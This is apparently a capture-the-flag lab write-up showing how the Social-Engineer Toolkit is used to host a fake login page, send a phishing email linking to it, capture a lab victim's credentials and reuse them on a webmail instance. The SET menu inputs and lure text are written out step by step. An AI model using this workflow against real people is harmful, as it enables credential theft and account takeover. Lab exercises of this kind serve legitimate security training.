---
title: Day 2: Phising - Merry Clickmas
---

This challenge is about sending a phising email and capturing the victim's email and password using [SET](https://github.com/trustedsec/social-engineer-toolkit).
...
First we start a fake login screen on port 8000, which captures all entered usernames and passwords.

After that, we send a phising email using the following:
```bash
sudo setoolkit
set> 1
set> 5
...
set:phishing> SMTP email server address (ex. smtp.youremailserveryouown.com):IP
set:phishing> Port number for the SMTP server [25]:  
set:phishing> Flag this message/s as high priority? [yes|no]:no
set:phishing>Do you want to attach a file - [y/n]: n
set:phishing> Do you want to attach an inline file - [y/n]: n
...
Next line of the body: Please confirm the new schedule by visiting http://IP:8000
Next line of the body: Best regards,
Next line of the body: Flying Deer
Next line of the body: END
```

After a few seconds, we can see that someone logged into our fake login screen using username `admin` and password `unranked-wisdom-anthem`

Using this password, we can log into the roundcube (webmail) instance at `http://IP`, using username `factory` and password `unranked-wisdom-anthem`.